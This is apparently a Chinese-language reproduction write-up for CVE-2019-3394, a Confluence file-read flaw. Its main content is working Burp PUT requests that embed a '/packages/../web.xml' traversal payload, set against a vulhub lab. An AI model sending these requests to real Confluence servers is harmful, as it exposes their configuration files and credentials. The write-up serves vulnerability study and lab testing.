# CVE-2019-3394
Confluence（install-directory>/confluence/WEB-INF/）文件读取漏洞


## BurpSuite Request

#### vuln_url http://10.10.20.166:8090/rest/api/content/65610?status=draft
```
PUT /rest/api/content/65610?status=draft HTTP/1.1
Host: 10.10.20.166:8090
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/json; charset=utf-8
X-Requested-With: XMLHttpRequest
Referer: http://10.10.20.166:8090/pages/resumedraft.action?draftId=65610&draftShareId=58f4ea64-a2bd-473d-93ce-157cf3c229f3
Content-Length: 490
Cookie: JSESSIONID=FFD0CA6A6268E12E69A566AAD965B17A
X-Forwarded-For: 127.0.0.1
Connection: close

{"status":"current","title":"test","space":{"key":"JAS"},"body":{"editor":{"value":"<p><img class=\"confluence-embedded-image confluence-external-resource\" style=\"max-height: 250px;\" src=\"http://10.10.20.166:8090/packages/../web.xml\" data-image-src=\"/packages/../web.xml\" /></p>","representation":"editor","content":{"id":"65610"}}},"id":"65610","type":"page","version":{"number":1,"minorEdit":true,"syncRev":"0.mlIer8AOrlZcj7dg7IWDwUc.5"},"ancestors":[{"id":"65586","type":"page"}]}
```
#### change

`src=\"http://10.10.20.166:8090/packages/../web.xml\"`

to

`src=\"/packages/../web.xml\"`

```
PUT /rest/api/content/65610?status=draft HTTP/1.1
Host: 10.10.20.166:8090
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/json; charset=utf-8
X-Requested-With: XMLHttpRequest
Referer: http://10.10.20.166:8090/pages/resumedraft.action?draftId=65610&draftShareId=58f4ea64-a2bd-473d-93ce-157cf3c229f3
Content-Length: 490
Cookie: JSESSIONID=FFD0CA6A6268E12E69A566AAD965B17A
X-Forwarded-For: 127.0.0.1
Connection: close

{"status":"current","title":"test","space":{"key":"JAS"},"body":{"editor":{"value":"<p><img class=\"confluence-embedded-image confluence-external-resource\" style=\"max-height: 250px;\" src=\"/packages/../web.xml\" data-image-src=\"/packages/../web.xml\" /></p>","representation":"editor","content":{"id":"65610"}}},"id":"65610","type":"page","version":{"number":1,"minorEdit":true,"syncRev":"0.mlIer8AOrlZcj7dg7IWDwUc.5"},"ancestors":[{"id":"65586","type":"page"}]}
```

## 0x00 简介

Confluence Server 和 Data Center 在页面导出功能中存在本地文件泄露漏洞：具有“添加页面”空间权限的远程攻击者，能够读取 <install-directory>/confluence/WEB-INF/ 目录下的任意文件。
该目录可能包含用于与其他服务集成的配置文件，可能会泄漏认证凭据，例如 LDAP 认证凭据或其他敏感信息。
  
  
### 漏洞影响版本：
6.1.0 <= version < 6.6.16
6.7.0 <= version < 6.13.7
6.14.0 <= version < 6.15.8
  
## 0x01 CVE-2019-3394漏洞复现过程
 
### 测试环境： Atlassian Confluence 6.10.2
 
`root@kali:~/vulhub/confluence/CVE-2019-3396# docker-compose up -d`

```
  root@kali:~/vulhub/confluence/CVE-2019-3396# docker-compose up -d
cve-2019-3396_db_1 is up-to-date
cve-2019-3396_web_1 is up-to-date
root@kali:~/vulhub/confluence/CVE-2019-3396# docker ps -a
CONTAINER ID        IMAGE                              COMMAND                  CREATED             STATUS              PORTS                                            NAMES
ab287d68d994        vulhub/confluence:6.10.2           "/docker-entrypoint.…"   2 hours ago         Up 2 hours          0.0.0.0:8090->8090/tcp, 8091/tcp                 cve-2019-3396_web_1
1f58f73d5349        postgres:10.7-alpine               "docker-entrypoint.s…"   2 hours ago         Up 2 hours          5432/tcp                                         cve-2019-3396_db_1

 ```
 
 `/opt/atlassian/confluence/confluence/WEB-INF`
 
 目录下的文件
 
 ```
 ./admin/longrunningtask-xml.vm
./WEB-INF/glue-config.xml
./WEB-INF/urlrewrite.xml
./WEB-INF/web.xml
./WEB-INF/decorators.xml
./WEB-INF/sitemesh.xml
./WEB-INF/lib/batik-xml-1.9.jar
./WEB-INF/lib/xml-apis-ext-1.3.04.jar
./WEB-INF/lib/atlassian-secure-xml-3.2.11.jar
./WEB-INF/lib/xmlrpc-supplementary-character-support-0.2.jar
./WEB-INF/lib/xmlgraphics-commons-2.2.jar
./WEB-INF/lib/xmlrpc-2.0+xmlrpc61.1+sbfix.jar
./WEB-INF/classes/seraph-config.xml
./WEB-INF/classes/seraph-paths.xml
./importexport/includes/export-xml.vm
./search/osd.xml
./META-INF/maven/com.atlassian.confluence/confluence-webapp/pom.xml
```


## 参考链接：

https://github.com/vulhub/vulhub/blob/master/confluence/CVE-2019-3396/README.md
